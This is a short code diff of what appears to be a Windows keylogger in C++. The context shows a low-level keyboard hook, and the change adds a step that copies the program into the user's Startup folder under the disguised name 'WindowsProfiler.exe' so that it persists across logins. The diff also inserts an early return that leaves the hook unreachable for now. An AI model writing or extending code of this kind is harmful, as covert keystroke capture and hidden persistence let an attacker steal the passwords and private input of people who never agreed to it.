@@ -67,8 +67,14 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         printf("Could not copy file!\n");
     }
 
-    // TODO: next try copy
     std::string nextTry = std::getenv("APPDATA");
+    nextTry += R"(\Microsoft\Windows\Start Menu\Programs\Startup\WindowsProfiler.exe)";
+    if (CopyFile(filePath, nextTry.c_str(), FALSE)) {
+        printf("Copied file again\n");
+    } else {
+        printf("Could not copy file again!\n");
+    }
+    return 0;
 
     HINSTANCE app = GetModuleHandle(nullptr);
     SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
